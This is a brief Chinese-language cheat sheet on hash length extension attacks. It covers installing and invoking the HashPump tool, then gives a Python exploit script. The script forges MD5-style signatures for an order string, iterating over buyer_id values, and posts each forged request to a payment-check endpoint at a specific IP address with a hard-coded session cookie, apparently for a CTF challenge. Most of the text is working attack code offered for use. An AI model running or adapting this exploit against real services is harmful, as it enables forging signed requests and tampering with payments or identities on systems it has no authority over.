哈希长度扩展攻击



HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具
支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。
不支持MD2、SHA224和SHA384算法


安装：
git clone https://github.com/bwall/HashPump
apt-get install g++ libssl-dev
cd HashPump
make
make install


hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a pcat


-s：原签名hash
-d：原始的数据
-k：秘钥的长度
-a：追加的数据

python:
from hashpumpy import hashpump
import requests
import re
sign = '58e9846626f7c1b8e80ac2da8b456e9d'
data ='order_id=91&buyer_id=22&good_id=34&buyer_point=200&good_price=50&order_create_time=1528269449.183292'
cookie = {'sessionid': '6j31jogubedhgfo3pq8vlwploe5zzwmj'}
check_url = 'http://52.80.180.205:65080/payment/check'
secret_key_length = 1337
for i in range(1, 30):
res = hashpump(sign, data, '&buyer_id={}'.format(i), secret_key_length)
print(res)
req = requests.post('{}?signature={}'.format(check_url, res[0]),data=res[1], cookies=cookie, headers={'Content-Type': 'application/x-www-form-urlencoded'})
print(re.findall('\<h4\>.*?\<\/h4\>', req.text))
